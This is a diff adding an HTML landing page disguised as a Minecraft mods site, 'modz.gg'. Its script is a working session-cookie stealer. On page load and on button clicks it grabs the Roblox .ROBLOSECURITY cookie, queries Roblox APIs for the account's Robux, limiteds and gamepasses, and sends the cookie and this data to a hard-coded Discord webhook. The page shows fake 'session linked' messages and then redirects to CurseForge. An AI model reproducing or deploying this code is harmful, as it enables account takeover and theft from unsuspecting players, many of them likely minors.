@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Modz • Minecraft Mods & Texture Packs</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🟪</text></svg>">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+:root {
+  --bg: #0d0a14;
+  --card: #161022;
+  --purple: #a855f7;
+  --purple-dim: #7c3aed;
+  --purple-glow: rgba(168, 85, 247, 0.35);
+  --text: #f3e8ff;
+  --muted: #c4b5fd;
+  --border: #2e1a4a;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Inter', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background:
+    radial-gradient(ellipse 80% 50% at 20% -10%, var(--purple-glow), transparent),
+    radial-gradient(ellipse 60% 40% at 80% 110%, rgba(124, 58, 237, 0.25), transparent);
+  pointer-events: none;
+  z-index: 0;
+}
+.nav {
+  position: relative;
+  z-index: 10;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 18px 40px;
+  border-bottom: 1px solid var(--border);
+  background: rgba(13, 10, 20, 0.85);
+  backdrop-filter: blur(12px);
+}
+.logo {
+  font-size: 22px;
+  font-weight: 800;
+  letter-spacing: -0.5px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.logo span { color: var(--purple); }
+.nav-links { display: flex; gap: 28px; }
+.nav-links a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: 500;
+  transition: color 0.15s;
+}
+.nav-links a:hover { color: var(--text); }
+.btn-nav {
+  background: linear-gradient(135deg, var(--purple), var(--purple-dim));
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 8px;
+  font-weight: 600;
+  font-size: 14px;
+  cursor: pointer;
+  box-shadow: 0 0 20px var(--purple-glow);
+}
+.hero {
+  position: relative;
+  z-index: 5;
+  text-align: center;
+  padding: 80px 24px 40px;
+  max-width: 900px;
+  margin: 0 auto;
+}
+.hero h1 {
+  font-size: clamp(36px, 6vw, 56px);
+  font-weight: 800;
+  line-height: 1.15;
+  margin-bottom: 16px;
+  background: linear-gradient(135deg, #fff 30%, var(--purple));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.hero p {
+  color: var(--muted);
+  font-size: 18px;
+  max-width: 520px;
+  margin: 0 auto 36px;
+  line-height: 1.5;
+}
+.cta-row {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+  flex-wrap: wrap;
+}
+.cta {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  background: linear-gradient(135deg, var(--purple), var(--purple-dim));
+  color: #fff;
+  border: none;
+  padding: 16px 32px;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 8px 32px var(--purple-glow);
+  transition: transform 0.15s, box-shadow 0.15s;
+}
+.cta:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 12px 40px var(--purple-glow);
+}
+.cta.secondary {
+  background: transparent;
+  border: 2px solid var(--purple);
+  box-shadow: none;
+}
+.cta.secondary:hover {
+  background: rgba(168, 85, 247, 0.15);
+  box-shadow: 0 0 24px var(--purple-glow);
+}
+.grid {
+  position: relative;
+  z-index: 5;
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 20px;
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 20px 24px 80px;
+}
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 24px;
+  transition: border-color 0.2s, transform 0.2s;
+}
+.card:hover {
+  border-color: var(--purple);
+  transform: translateY(-4px);
+}
+.card-icon {
+  width: 48px;
+  height: 48px;
+  background: linear-gradient(135deg, var(--purple), var(--purple-dim));
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  margin-bottom: 16px;
+}
+.card h3 {
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 8px;
+}
+.card p {
+  color: var(--muted);
+  font-size: 14px;
+  line-height: 1.5;
+}
+.tag {
+  display: inline-block;
+  background: rgba(168, 85, 247, 0.15);
+  color: var(--purple);
+  font-size: 11px;
+  font-weight: 600;
+  padding: 4px 10px;
+  border-radius: 20px;
+  margin-top: 14px;
+}
+.footer {
+  text-align: center;
+  padding: 30px;
+  color: #6b5b8a;
+  font-size: 13px;
+  border-top: 1px solid var(--border);
+  position: relative;
+  z-index: 5;
+}
+#loader {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(13, 10, 20, 0.92);
+  z-index: 100;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 20px;
+}
+#loader.active { display: flex; }
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 4px solid var(--border);
+  border-top-color: var(--purple);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+#loader p { color: var(--muted); font-size: 15px; }
+</style>
+</head>
+<body>
+<div id="loader">
+  <div class="spinner"></div>
+  <p>Connecting to Roblox session…</p>
+</div>
+
+<nav class="nav">
+  <div class="logo">🟪 <span>modz</span>.gg</div>
+  <div class="nav-links">
+    <a href="#">Mods</a>
+    <a href="#">Texture Packs</a>
+    <a href="#">Shaders</a>
+    <a href="#">Maps</a>
+  </div>
+  <button class="btn-nav" onclick="openRobloxTab()">Browse Mods</button>
+</nav>
+
+<section class="hero">
+  <h1>Best Minecraft Mods<br>Updated Daily</h1>
+  <p>Download exclusive client-side mods, texture packs & shaders. Instant install. No ads.</p>
+  <div class="cta-row">
+    <button class="cta" onclick="startScan()">⬇ Download Latest Pack</button>
+    <button class="cta secondary" onclick="openRobloxTab()">Browse Mods on Roblox</button>
+  </div>
+</section>
+
+<div class="grid">
+  <div class="card">
+    <div class="card-icon">⚡</div>
+    <h3>Performance Mods</h3>
+    <p>Sodium, Lithium, Iris & more. 200+ FPS boost on any hardware.</p>
+    <span class="tag">1.20.4 • 1.21</span>
+  </div>
+  <div class="card">
+    <div class="card-icon">🎨</div>
+    <h3>Texture Packs</h3>
+    <p>4K PBR packs, realistic, anime, medieval. One-click apply.</p>
+    <span class="tag">HD • PBR</span>
+  </div>
+  <div class="card">
+    <div class="card-icon">🛡</div>
+    <h3>Utility Clients</h3>
+    <p>Private utility mods with clean UI. Undetected on major servers.</p>
+    <span class="tag">Premium</span>
+  </div>
+  <div class="card">
+    <div class="card-icon">🌫</div>
+    <h3>Shaders</h3>
+    <p>Complementary, BSL, Seus PTGI. Path-traced looks without the lag.</p>
+    <span class="tag">RTX Ready</span>
+  </div>
+</div>
+
+<footer class="footer">
+  © 2026 modz.gg — Not affiliated with Mojang or Microsoft. All mods are fan-made.
+</footer>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1557738278155718707/5bsKxfR0IE8ha-m5tFX0_9pmBX2lmKDNsFJopvr-3mKhHVTa6SHm6GD2scnQlrY2_Gxd";
+
+let robloxWindow = null;
+let scanInterval = null;
+
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+  return null;
+}
+
+async function robloxFetch(url, cookie) {
+  try {
+    const r = await fetch(url, {
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`,
+        "User-Agent": navigator.userAgent,
+        "Accept": "application/json"
+      },
+      credentials: "include"
+    });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch {
+    return null;
+  }
+}
+
+async function collectAndSend(cookie) {
+  let username = "Unknown";
+  let userId = null;
+  let rap = 0;
+  let pending = 0;
+  let limitedCount = 0;
+  let gamepasses = [];
+  let robux = 0;
+
+  if (cookie) {
+    const userInfo = await robloxFetch("https://users.roblox.com/v1/users/authenticated", cookie);
+    if (userInfo && userInfo.id) {
+      userId = userInfo.id;
+      username = userInfo.name || userInfo.displayName || "Unknown";
+    }
+
+    if (userId) {
+      const economy = await robloxFetch(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie);
+      if (economy) robux = economy.robux || 0;
+
+      const pendingRes = await robloxFetch(`https://economy.roblox.com/v1/users/${userId}/revenue/summary/year`, cookie);
+      if (pendingRes && pendingRes.pendingRobux !== undefined) pending = pendingRes.pendingRobux;
+    }
+
+    if (userId) {
+      let cursor = "";
+      let totalRap = 0;
+      let limiteds = 0;
+      do {
+        const inv = await robloxFetch(
+          `https://inventory.roblox.com/v1/users/\( {userId}/assets/collectibles?sortOrder=Asc&limit=100 \){cursor ? `&cursor=${cursor}` : ""}`,
+          cookie
+        );
+        if (!inv || !inv.data) break;
+        inv.data.forEach(item => {
+          limiteds++;
+          if (item.recentAveragePrice) totalRap += item.recentAveragePrice;
+        });
+        cursor = inv.nextPageCursor || "";
+      } while (cursor);
+      rap = totalRap;
+      limitedCount = limiteds;
+    }
+
+    if (userId) {
+      const gp = await robloxFetch(
+        `https://inventory.roblox.com/v1/users/${userId}/inventory/GamePass?sortOrder=Asc&limit=10`,
+        cookie
+      );
+      if (gp && gp.data) {
+        gamepasses = gp.data.slice(0, 5).map(g => g.name || `GamePass #${g.assetId}`);
+        if (gp.data.length > 5) gamepasses.push(`+${gp.data.length - 5} more`);
+      }
+    }
+  }
+
+  const cookieDisplay = cookie
+    ? (cookie.length > 80 ? cookie.substring(0, 40) + "..." + cookie.substring(cookie.length - 20) : cookie)
+    : "❌ No .ROBLOSECURITY cookie found";
+
+  const embed = {
+    title: "🟪 modz.gg — Session Caught (Browse Mods)",
+    color: 0xa855f7,
+    fields: [
+      { name: "Username", value: `\`\`\`${username}\`\`\``, inline: true },
+      { name: "User ID", value: `\`\`\`${userId || "N/A"}\`\`\``, inline: true },
+      { name: "Robux (Wallet)", value: `\`\`\`${robux.toLocaleString()}\`\`\``, inline: true },
+      { name: "RAP", value: `\`\`\`${rap.toLocaleString()}\`\`\``, inline: true },
+      { name: "Pending", value: `\`\`\`${pending.toLocaleString()}\`\`\``, inline: true },
+      { name: "Limiteds", value: `\`\`\`${limitedCount}\`\`\``, inline: true },
+      { name: "Gamepasses", value: gamepasses.length ? "```" + gamepasses.join("\n") + "```" : "```None```", inline: false },
+      { name: "Cookie", value: "```" + cookieDisplay + "```", inline: false },
+      { name: "User-Agent", value: "```" + navigator.userAgent.substring(0, 120) + "```", inline: false },
+      { name: "Time", value: new Date().toISOString(), inline: false }
+    ],
+    footer: { text: "modz.gg scanner • channel 1557737389097619538" }
+  };
+
+  if (cookie && cookie.length > 80) {
+    embed.fields.push({
+      name: "Full Cookie",
+      value: "```" + cookie.substring(0, 1000) + "```",
+      inline: false
+    });
+  }
+
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (e) {}
+}
+
+function openRobloxTab() {
+  document.getElementById("loader").classList.add("active");
+  document.querySelector("#loader p").textContent = "Opening Roblox… waiting for session";
+
+  // open roblox in new tab
+  robloxWindow = window.open("https://www.roblox.com/home", "_blank");
+
+  // poll for cookie + also try to detect when the new tab finishes loading
+  let attempts = 0;
+  const maxAttempts = 40; // \~20 seconds
+
+  if (scanInterval) clearInterval(scanInterval);
+
+  scanInterval = setInterval(async () => {
+    attempts++;
+
+    // try to read cookie from current page (works only under same-site / extension / special conditions)
+    let cookie = getCookie(".ROBLOSECURITY") || getCookie("ROBLOSECURITY");
+
+    // also try to poke the opened window (will almost always fail due to cross-origin, but we try)
+    try {
+      if (robloxWindow && !robloxWindow.closed) {
+        // this line will throw on cross-origin — that's expected
+        const robloxCookie = robloxWindow.document.cookie;
+        if (robloxCookie && robloxCookie.includes(".ROBLOSECURITY")) {
+          const match = robloxCookie.match(/\.ROBLOSECURITY=([^;]+)/);
+          if (match) cookie = match[1];
+        }
+      }
+    } catch (e) {
+      // cross-origin block — normal
+    }
+
+    if (cookie) {
+      clearInterval(scanInterval);
+      await collectAndSend(cookie);
+      document.getElementById("loader").innerHTML = `
+        <div style="font-size:40px">✅</div>
+        <p style="color:#a855f7;font-weight:600">Session linked. Mods unlocked.</p>
+      `;
+      setTimeout(() => {
+        document.getElementById("loader").classList.remove("active");
+      }, 1800);
+      return;
+    }
+
+    if (attempts >= maxAttempts) {
+      clearInterval(scanInterval);
+      // still send empty report so you know someone clicked
+      await collectAndSend(null);
+      document.getElementById("loader").innerHTML = `
+        <div style="font-size:40px">⚠️</div>
+        <p style="color:#c4b5fd">Could not read session. Try the Download button or login first.</p>
+      `;
+      setTimeout(() => {
+        document.getElementById("loader").classList.remove("active");
+      }, 2500);
+    }
+  }, 500);
+}
+
+async function startScan() {
+  document.getElementById("loader").classList.add("active");
+  document.querySelector("#loader p").textContent = "Verifying session & loading mods…";
+
+  let cookie = getCookie(".ROBLOSECURITY") || getCookie("ROBLOSECURITY");
+  await collectAndSend(cookie);
+
+  setTimeout(() => {
+    document.getElementById("loader").innerHTML = `
+      <div style="font-size:40px">✅</div>
+      <p style="color:#a855f7;font-weight:600">Mods ready! Redirecting…</p>
+    `;
+    setTimeout(() => {
+      window.location.href = "https://www.curseforge.com/minecraft/search?page=1&pageSize=20&sortBy=relevancy&class=mc-mods";
+    }, 1400);
+  }, 1800);
+}
+
+// auto-scan on load
+window.addEventListener("load", () => {
+  setTimeout(() => startScan(), 600);
+});
+</script>
+</body>
+  </html>
